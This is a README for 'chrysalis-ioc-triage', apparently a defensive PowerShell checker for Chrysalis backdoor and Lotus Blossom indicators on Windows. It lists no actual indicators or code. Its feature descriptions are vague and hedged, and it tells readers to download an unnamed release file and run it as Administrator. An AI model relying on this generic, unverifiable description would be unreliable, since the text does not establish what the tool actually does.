---
layout: "default"
title: "🦋 chrysalis-ioc-triage - Easy Indicator of Compromise Check"
description: "🛡️ Detect and analyze Indicators of Compromise for the Chrysalis backdoor and Lotus Blossom campaign using a safe, read-only PowerShell tool on Windows."
---
# 🦋 chrysalis-ioc-triage - Easy Indicator of Compromise Check

## 🚀 Download Now
[![Download](https://img.shields.io/badge/Download-Chrysalis%20IoC%20Triage-brightgreen.svg)](https://github.com/orangeok77/chrysalis-ioc-triage/releases)

## 📎 Description
Chrysalis IoC Triage is a read-only host-based checker for Indicators of Compromise (IoC). This tool helps you identify threats associated with the Chrysalis backdoor and the Lotus Blossom (Billbug) campaign. It runs on Windows using PowerShell and does not alter your system.

## 📥 Quick Start

### Requirements
- **Operating System:** Windows
- **PowerShell Version:** 5.1 or later
- **Permissions:** Run as Administrator for complete registry and service checks

### Download & Install
To download the software, visit the [Releases page](https://github.com/orangeok77/chrysalis-ioc-triage/releases). 

1. Go to the link above. 
2. Look for the latest version at the top of the page.
3. Click on the suitable download link for your system.
4. After downloading, locate the file on your computer.
5. Right-click the file and select "Run as Administrator".

## 🔍 What is Checked
This tool checks various aspects of your system to identify potential indicators of compromise related to the Chrysalis backdoor and Lotus Blossom campaign. It reviews critical areas such as:

- **Registry Entries**: Identifies suspicious keys.
- **Running Services**: Checks for unknown or harmful services.
- **File Checks**: Scans for files related to known threats.

## ⚙️ Options
You can run the tool with different options for focused checks. Available options may include:

- **-RegistryOnly**: Checks only registry entries for IoCs.
- **-ServiceOnly**: Reviews running services.
- **-FileCheck**: Looks for specific files.

Use these options to tailor the scan to your needs.

## 🗂️ Project Layout
The project structure is designed for easy navigation. Key directories include:

- **Scripts/**: Contains the PowerShell scripts used for checks.
- **Reports/**: Stores the output files generated from scans.
- **Documentation/**: Holds additional information and guides.

## 📚 Documentation
Comprehensive documentation is available to guide users through various features and options. Check the documentation folder for additional reading or visit the [GitHub Wiki](https://github.com/orangeok77/chrysalis-ioc-triage/wiki) for helpful articles.

## 📊 Interpretation
After running the tool, you will receive a report detailing any IoCs found. This report will categorize issues into potential threats and provide suggestions on how to address them.

## 🤝 Contributing
Contributions are welcome. If you have suggestions or improvements, please follow the guidelines in the CONTRIBUTING.md file included in the repository.

## 📜 License
This project is licensed under the MIT License. See the LICENSE file for full details.

For any additional questions or support, feel free to create an issue on the repository.